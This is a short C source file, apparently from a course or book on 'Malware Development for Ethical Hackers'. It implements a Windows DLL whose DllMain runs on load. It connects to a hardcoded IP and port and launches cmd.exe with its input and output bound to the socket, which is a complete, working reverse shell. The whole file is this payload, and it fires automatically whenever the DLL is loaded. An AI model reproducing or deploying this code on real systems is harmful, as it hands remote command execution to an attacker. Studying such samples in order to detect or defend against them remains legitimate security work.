/* 
 * Malware Development for Ethical Hackers
 * hack2.c - win reverse shell
 * author: @cocomelonc
*/

#define TARGET_IP "10.10.1.5"
#define TARGET_PORT 4445

#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET socketWin;
SOCKET socketConnection;
struct sockaddr_in serverAddress;

STARTUPINFO processStartupInfo;
PROCESS_INFORMATION processInfo;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
  WSAStartup(MAKEWORD(2,2), &wsaData);
  socketWin = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  serverAddress.sin_family = AF_INET;
  serverAddress.sin_port = htons(TARGET_PORT);
  serverAddress.sin_addr.s_addr = inet_addr(TARGET_IP);

  WSAConnect(socketWin, (SOCKADDR*)&serverAddress, sizeof(serverAddress), NULL, NULL, NULL, NULL);

  memset(&processStartupInfo, 0, sizeof(processStartupInfo));
  processStartupInfo.cb = sizeof(processStartupInfo);
  processStartupInfo.dwFlags = STARTF_USESTDHANDLES;
  processStartupInfo.hStdInput = processStartupInfo.hStdOutput = processStartupInfo.hStdError = (HANDLE)socketWin;

  CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &processStartupInfo, &processInfo);

  return TRUE;
}
